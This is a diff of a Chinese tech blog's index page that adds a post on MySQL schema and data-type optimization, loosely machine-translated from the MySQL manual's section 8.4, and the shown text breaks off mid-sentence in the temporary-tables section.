@@ -346,7 +346,7 @@
       
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档<span class="badge">264</span></a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档<span class="badge">265</span></a>
 
   </li>
         
@@ -467,7 +467,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/shell/shell-1/">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/mysql/optimization-sql-data-structure/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="上善若水">
@@ -487,7 +487,225 @@
           <h2 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2018/03/24/shell/shell-1/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/18/index.html">java后台常用命令</a>
+                <a href="/2018/03/24/mysql/optimization-sql-data-structure/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/18/index.html">SQL优化【数据结构】</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/mysql/" itemprop="url" rel="index"><span itemprop="name">mysql</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><img src="https://upload-images.jianshu.io/upload_images/6434888-99afb8532ed7f3db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>在作为数据库设计师的角色中，寻找组织模式，表和列的最有效方式。<br>与调整应用程序代码时一样，您可以最大限度地减少I / O，将相关项目集中在一起，并提前进行计划，<br>以便随着数据量的增加性能保持在较高水平 从高效的数据库设计开始，<br>团队成员可以更轻松地编写高性能的应用程序代码，并使数据库可以随应用程序的演变和重写而持续下去。</p>
+<p>8.4.1优化数据大小<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">设计您的表格以尽量减少磁盘空间。</span><br><span class="line">这可以通过减少写入和读取磁盘的数据量来实现巨大的改进。</span><br><span class="line">在查询执行期间，较小的表格通常需要较少的主存储器，而其内容正在被主动处理。</span><br><span class="line">表数据的任何空间减少也会导致可以更快处理的更小的索引。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MySQL支持许多不同的存储引擎（表格类型）和行格式。</span><br><span class="line">对于每个表格，您可以决定使用哪种存储和索引方法。</span><br><span class="line">为您的应用程序选择适当的表格格式可以为您带来巨大的性能提升。</span><br><span class="line">请参阅 第14章InnoDB存储引擎和 第15章备用存储引擎。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过使用此处列出的技术，您可以获得更好的表格性能并最小化存储空间：</span><br><span class="line"></span><br><span class="line">表列</span><br><span class="line"></span><br><span class="line">行格式</span><br><span class="line"></span><br><span class="line">索引</span><br><span class="line"></span><br><span class="line">加盟</span><br><span class="line"></span><br><span class="line">正常化</span><br><span class="line"></span><br><span class="line">表列</span><br><span class="line">尽可能使用最有效（最小）的数据类型。</span><br><span class="line">MySQL有很多专门的类型可以节省磁盘空间和内存。</span><br><span class="line">例如，如果可能的话，使用较小的整数类型来获得较小的表格。</span><br><span class="line"> MEDIUMINT通常是一个更好的选择，INT因为一 MEDIUMINT列使用的空间减少了25％。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOT NULL如果可能的话， 声明列。</span><br><span class="line">通过更好地使用索引并消除测试每个值是否存在开销，它使SQL操作更快NULL。</span><br><span class="line">您还可以节省一些存储空间，每列一位。</span><br><span class="line">如果您真的需要NULL表格中的值，请使用它们。</span><br><span class="line">只需避免允许NULL每列中的值的默认设置 。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">行格式</span><br><span class="line">InnoDB表格DYNAMIC默认使用行格式创建 。</span><br><span class="line">要在a 或语句中明确使用除了DYNAMIC，配置 innodb_default_row_format或指定ROW_FORMAT选项以外的行格式。</span><br><span class="line"> CREATE TABLEALTER TABLE</span><br><span class="line"></span><br><span class="line">行格式的紧凑系列，其中包括 COMPACT，DYNAMIC和COMPRESSED，以减少某些操作的CPU使用为代价来减少行存储空间。</span><br><span class="line">如果您的工作负载是受缓存命中率和磁盘速度限制的典型负载，则可能会更快。</span><br><span class="line">如果这是一个受CPU速度限制的罕见情况，则可能会变慢。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">紧凑的行格式系列还可以CHAR在使用诸如utf8mb3或的可变长度字符集时优化 列存储 utf8mb4。</span><br><span class="line">使用ROW_FORMAT=REDUNDANT， 占用字符集的最大字节长度×。</span><br><span class="line">许多语言主要使用单字节字符编写 ，因此固定的存储长度通常会浪费空间。</span><br><span class="line">使用紧凑的行格式系列，可在to 范围内分配可变数量的存储空间 CHAR(N)Nutf8InnoDBNN×通过去除尾部空格来为这些列设置字符集的最大字节长度。</span><br><span class="line">最小存储长度为 N字节，便于在典型情况下进行就地更新。</span><br><span class="line">有关更多信息，请参见 第14.8.1.2节“InnoDB表的物理行结构”。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">要通过以压缩形式存储表数据来进一步减少空间，请ROW_FORMAT=COMPRESSED在创建InnoDB表时 指定 ，或在现有表上运行 myisampack命令 MyISAM。</span><br><span class="line">（InnoDB压缩表是可读可写的，而MyISAM压缩表是只读的。</span><br><span class="line">）</span><br><span class="line"></span><br><span class="line">对于MyISAM表中，如果没有任何可变长度列（VARCHAR， TEXT，或 BLOB列），一个固定大小的行格式被使用。</span><br><span class="line">这会更快，但可能会浪费一些空间。</span><br><span class="line">请参见第15.2.3节“MyISAM表格存储格式”。</span><br><span class="line">即使VARCHAR列中包含CREATE TABLE选项 ，您也可以提示您想要固定长度的行ROW_FORMAT=FIXED。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">索引</span><br><span class="line">表格的主要索引应尽可能短。</span><br><span class="line">这使得每一行的识别简单且高效。</span><br><span class="line">对于InnoDB表，主键列在每个二级索引条目中都是重复的，所以如果有很多二级索引，则较短的主键会节省相当多的空间。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">只创建您需要提高查询性能的索引。</span><br><span class="line">索引很适合检索，但会减慢插入和更新操作。</span><br><span class="line">如果您主要通过在列组合上搜索来访问表，请在其上创建一个合成索引，而不是每个列的单独索引。</span><br><span class="line">指数的第一部分应该是最常用的列。</span><br><span class="line">如果从表格中选择时总是使用多列，则索引中的第一列应该是重复次数最多的列，以便更好地压缩索引。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果长字符串列很可能在第一个字符数上有一个唯一的前缀，那么最好只索引这个前缀，使用MySQL支持在列的最左边部分创建一个索引（请参见第13.1.14节，“CREATE INDEX Syntax”）。</span><br><span class="line">更短的索引速度更快，不仅因为它们需要更少的磁盘空间，还因为它们还会在索引缓存中为您提供更多的点击量，因此磁盘搜索量更少。</span><br><span class="line">请参见 第5.1.1节“配置服务器”。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">加盟</span><br><span class="line">在某些情况下，分割成两个经常扫描的表格可能是有益的。</span><br><span class="line">如果它是一个动态格式的表格，并且可以使用一个较小的静态格式表格来扫描表格时可以用来查找相关的行，那么情况尤其如此。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在具有相同数据类型的不同表中使用相同信息声明列，以根据相应列加快联接。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">保持列名简单，以便您可以在不同的表中使用相同的名称并简化连接查询。</span><br><span class="line">例如，在一个名为table的表中customer，使用一个列名来name代替 customer_name。</span><br><span class="line">为了让您的名字可移植到其他SQL服务器，请考虑将它们保持为少于18个字符。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">正常化</span><br><span class="line">通常，尽量保持所有数据不冗余（观察数据库理论中提到的 第三范式）。</span><br><span class="line">不必重复诸如名称和地址之类的冗长值，而是为它们分配唯一的ID，根据需要在多个较小的表中重复这些ID，并通过引用join子句中的ID来加入查询中的表。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果速度比磁盘空间更重要以及保留多个数据副本的维护成本（例如，在分析大型表中的所有数据的商业智能场景中），则可以放宽规范化规则，复制信息或创建汇总表以获得更多速度。</span><br></pre></td></tr></table></figure></p>
+<p>{———-}</p>
+<p>8.4.2优化MySQL数据类型<br>8.4.2.1优化数字数据<br>8.4.2.2优化字符和字符串类型<br>8.4.2.3优化BLOB类型<br>8.4.2.4使用PROCEDURE ANALYZE<br>8.4.2.1优化数字数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">对于可以表示为字符串或数字的唯一ID或其他值，首选数字列来对字符串进行字符串。</span><br><span class="line">由于较大的数值可以以比相应的字符串更少的字节存储，因此速度更快，并且需要更少的内存来传输和比较它们。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果您使用的是数字数据，在许多情况下访问数据库（使用实时连接）的信息比访问文本文件要快。</span><br><span class="line">数据库中的信息可能以比文本文件更紧凑的格式存储，因此访问它涉及更少的磁盘访问。</span><br><span class="line">您还可以将代码保存在应用程序中，因为您可以避免解析文本文件以查找行和列边界。</span><br></pre></td></tr></table></figure></p>
+<p>8.4.2.2优化字符和字符串类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">对于字符和字符串列，请遵循以下准则：</span><br><span class="line"></span><br><span class="line">如果不需要特定于语言的归类功能，请使用二进制归类顺序进行快速比较和排序操作。</span><br><span class="line">您可以使用 BINARY操作员在特定查询中使用二进制排序规则。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在比较不同列的值时，尽可能使用相同的字符集和归类来声明这些列，以避免在运行查询时进行字符串转换。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">对于小于8KB大小的列值，请使用二进制 VARCHAR代替 BLOB。</span><br><span class="line">该GROUP BY 和ORDER BY条款可以生成临时表，这些临时表可以使用的 MEMORY存储引擎，如果原来的表不包含任何BLOB 列。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果一个表包含字符串列（如名称和地址），但许多查询不检索这些列，请考虑将字符串列拆分为单独的表，并在必要时使用具有外键的连接查询。</span><br><span class="line">当MySQL从一行中检索任何值时，它会读取一个包含该行所有列（可能还有其他相邻行）的数据块。</span><br><span class="line">保持每行较小，只有最常用的列，允许更多的行适合每个数据块。</span><br><span class="line">这些紧凑的表格减少了常见查询的磁盘I / O和内存使用量。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在表中使用随机生成的值作为主键InnoDB时，如果可能，请使用升序值（如当前日期和时间）作为前缀。</span><br><span class="line">当连续的主值被物理地存储在彼此附近时，InnoDB可以更快地插入和检索它们。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">有关数字列通常比等效字符串列更可取的原因，请参见第8.4.2.1节“针对数字数据优化”。</span><br></pre></td></tr></table></figure></p>
+<p>8.4.2.3优化BLOB类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">存储包含文本数据的大块时，请考虑先压缩它。</span><br><span class="line">当整个表被压缩，则不能使用这种技术 InnoDB或MyISAM。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">对于包含多个列的表，为了减少不使用BLOB列的查询的内存要求，请考虑将BLOB列拆分为单独的表，并在需要时使用连接查询引用它。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">由于检索和显示BLOB值的性能要求可能与其他数据类型有很大的不同，因此可以将BLOB特定的表放在不同的存储设备上，甚至是单独的数据库实例中。</span><br><span class="line">例如，要检索BLOB可能需要大量的顺序磁盘读取，这比较适合传统硬盘驱动器而非 SSD设备。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">有关二进制列有时比等效BLOB列更可取的原因，请参见第8.4.2.2节“优化字符和字符串类型”VARCHAR。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">您可以将列值的散列存储在单独的列中，对该列进行索引并在查询中测试散列值，而不是针对非常长的文本字符串测试相等性。</span><br><span class="line">（使用MD5()或 CRC32()函数来生成散列值。</span><br><span class="line">）由于散列函数可能会为不同的输入产生重复结果，因此您仍然在查询中包含一个子句 以防止错误匹配; 性能优势来自散列值的更小，易于扫描的索引。</span><br><span class="line"> AND blob_column = long_string_value</span><br></pre></td></tr></table></figure></p>
+<p>8.4.2.4使用PROCEDURE ANALYZE<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">ANALYSE([max_elements[,max_memory]])</span><br><span class="line"></span><br><span class="line">注意</span><br><span class="line">PROCEDURE ANALYSE() 从MySQL 5.7.18开始已弃用，并在MySQL 8.0中删除。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ANALYSE()检查查询的结果并返回结果分析，为每列提供最佳数据类型，这可能有助于减小表格大小。</span><br><span class="line">要获得此分析，请附加PROCEDURE ANALYSE到SELECT声明的结尾处 ：</span><br><span class="line"></span><br><span class="line">SELECT ... FROM ... WHERE ... PROCEDURE ANALYZE（[ max_elements，[ max_memory]]）</span><br><span class="line">例如：</span><br><span class="line"></span><br><span class="line">SELECT col1，col2 FROM table1 PROCEDURE ANALYZE（10，2000）;</span><br><span class="line">结果显示查询返回值的一些统计信息，并为列提出最佳数据类型。</span><br><span class="line">这对于检查现有表格或导入新数据后可能会有所帮助。</span><br><span class="line">您可能需要为参数尝试不同的设置，以便在PROCEDURE ANALYSE()不适ENUM当时不会显示 数据类型。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">参数是可选的，使用如下：</span><br><span class="line"></span><br><span class="line">max_elements（默认值为256）是ANALYSE()每列通知的最大不同值的数量 。</span><br><span class="line">这用于ANALYSE()检查最佳数据类型是否应该是类型的 ENUM; 如果有多个max_elements不同的值，则ENUM不是建议的类型。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">max_memory（默认8192）是ANALYSE()在尝试查找所有不同值时应分配每列的最大内存量 。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">一个PROCEDURE条款是不是在允许的 UNION声明。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">8.4.3优化许多表</span><br><span class="line">8.4.3.1 MySQL如何打开和关闭表格</span><br><span class="line">8.4.3.2在同一数据库中创建多个表的缺点</span><br><span class="line">一些快速保存单个查询的技术涉及将数据分割到多个表中。</span><br><span class="line">当表的数量达到数千甚至数百万时，处理所有这些表的开销成为新的性能考虑因素。</span><br></pre></td></tr></table></figure></p>
+<p>8.4.3.1 MySQL如何打开和关闭表格<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">当你执行mysqladmin status 命令时，你应该看到如下所示的内容：</span><br><span class="line"></span><br><span class="line">正常运行时间：426正在运行的线程：1问题：11082</span><br><span class="line">重新加载：1打开表格：12</span><br><span class="line">Open tables如果你只有六张桌子，12 的价值可能会有点令人费解。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MySQL是多线程的，因此可能有很多客户端同时为给定的表发出查询。</span><br><span class="line">为了尽量减少多个客户端会话在同一个表上具有不同状态的问题，该表由每个并发会话独立打开。</span><br><span class="line">这使用额外的内存，但通常会提高性能。</span><br><span class="line">使用MyISAM表格，打开表格的每个客户端的数据文件都需要一个额外的文件描述符。</span><br><span class="line">（相比之下，索引文件描述符在所有会话之间共享。</span><br><span class="line">）</span><br><span class="line"></span><br><span class="line">该table_open_cache和 max_connections系统变量影响服务器保持打开的文件的最大数量。</span><br><span class="line">如果您增加这些值中的一个或两个，则可能会遇到操作系统对每个进程打开的文件描述符数量施加的限制。</span><br><span class="line">许多操作系统允许您增加打开文件的限制，但方法在系统之间差别很大。</span><br><span class="line">请查阅您的操作系统文档以确定是否可以增加限制以及如何这样做。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table_open_cache与...有关max_connections。</span><br><span class="line">例如，对于200个并发运行连接，请至少指定一个表缓存大小，其中 是您执行的任何查询中每个连接的最大表数量。</span><br><span class="line">您还必须为临时表和文件保留一些额外的文件描述符。</span><br><span class="line"> 200 * NN</span><br><span class="line"></span><br><span class="line">确保您的操作系统可以处理table_open_cache设置隐含的打开文件描述符的数量 。</span><br><span class="line">如果 table_open_cache设置得太高，MySQL可能会耗尽文件描述符并拒绝连接，无法执行查询，并且非常不可靠。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">您还应该考虑到MyISAM存储引擎对于每个独特的打开表格需要两个文件描述符的事实 。</span><br><span class="line">对于分区 MyISAM表，打开的表的每个分区都需要两个文件描述符。</span><br><span class="line">（还要注意，当MyISAM打开一个分区表时，它会打开这个表的每个分区，不管是否实际使用了一个给定的分区，参见 MyISAM和分区文件描述符的用法。</span><br><span class="line">）可以使用 --open-files-limit启动选项到mysqld。</span><br><span class="line">参见 第B.5.2.17节“找不到文件和类似的错误”。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">打开表格的缓存保存在table_open_cache条目级别 。</span><br><span class="line">服务器在启动时自动调整缓存大小。</span><br><span class="line">要明确设置大小，请table_open_cache在启动时设置 系统变量。</span><br><span class="line">请注意，MySQL可能暂时打开更多的表来执行查询。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在下列情况下，MySQL会关闭一个未使用的表并将其从表缓存中删除：</span><br><span class="line"></span><br><span class="line">当缓存已满并且线程尝试打开不在缓存中的表时。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当缓存包含多个table_open_cache条目并且缓存中 的表不再被任何线程使用时。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">表冲洗操作发生时。</span><br><span class="line">当有人发出FLUSH TABLES语句或执行 mysqladmin flush-tables或 mysqladmin refresh命令时会发生这种情况。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当表缓存填满时，服务器使用以下过程来查找要使用的缓存条目：</span><br><span class="line"></span><br><span class="line">当前未使用的表格被释放，从最近使用的表格开始。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果需要打开新表，但缓存已满并且没有表可以释放，则缓存将根据需要暂时扩展。</span><br><span class="line">当缓存处于临时扩展状态并且表从已使用状态变为未使用状态时，表将关闭并从缓存中释放。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MyISAM为每个并发访问打开 一个表。</span><br><span class="line">这意味着如果两个线程访问同一个表，或者一个线程在同一个查询中访问了两次表（例如，通过将表连接到它自己），则需要打开两次表。</span><br><span class="line">每个并发打开需要表缓存中的条目。</span><br><span class="line">任何MyISAM表的第一次打开 需要两个文件描述符：一个用于数据文件，一个用于索引文件。</span><br><span class="line">该表的每次额外使用仅为数据文件提供一个文件描述符。</span><br><span class="line">索引文件描述符在所有线程之间共享。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果您正在使用该语句打开一个表，则会为该线程分配一个专用表对象。</span><br><span class="line">此表对象不被其他线程共享，并且在线程调用或线程终止之前不会关闭。</span><br><span class="line">发生这种情况时，该表将放回表缓存中（如果缓存未满）。</span><br><span class="line">请参见 第13.2.4节“HANDLER语法”。</span><br><span class="line"> HANDLER tbl_name OPENHANDLER tbl_name CLOSE</span><br><span class="line"></span><br><span class="line">您可以通过检查mysqld状态变量来确定表缓存是否过小，该变量 Opened_tables指示自服务器启动以来的表开放操作数：</span><br><span class="line"></span><br><span class="line">MySQL的&gt; SHOW GLOBAL STATUS LIKE &apos;Opened_tables&apos;;</span><br><span class="line">+ --------------- + ------- +</span><br><span class="line">| 变量名| 值|</span><br><span class="line">+ --------------- + ------- +</span><br><span class="line">| Opened_tables | 2741 |</span><br><span class="line">+ --------------- + ------- +</span><br><span class="line">如果该值非常大或快速增加，即使您没有发出很多FLUSH TABLES语句，也要增加表缓存大小。</span><br><span class="line">请参见第5.1.7节“服务器系统变量”和 第5.1.9节“服务器状态变量”。</span><br></pre></td></tr></table></figure></p>
+<p>8.4.3.2在同一数据库中创建多个表的缺点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果MyISAM在同一数据库目录中有多个表，则打开，关闭和创建操作会很慢。</span><br><span class="line">如果您SELECT 在许多不同的表上执行语句，那么当表缓存满时会有一些开销，因为对于每个必须打开的表，必须关闭另一个表。</span><br><span class="line">您可以通过增加表缓存中允许的条目数来减少此开销。</span><br></pre></td></tr></table></figure></p>
+<p>8.4.4在MySQL中使用内部临时表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">在某些情况下，服务器在处理语句时创建内部临时表。</span><br><span class="line">用户无法直接控制何时发生。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">服务器在如下条件下创建临时表：</span><br><span class="line"></span><br><span class="line">对UNION 报表的评估，稍后会有一些例外情况。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">评估一些视图，例如那些使用TEMPTABLE算法 UNION或聚合的视图 。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">派生表的评估（见 第13.2.10.8节“派生表”）。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">为子查询或半连接实现创建的表（请参见第8.2.2节“优化子查询，派生表和视图引用”）。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">评估包含一个ORDER 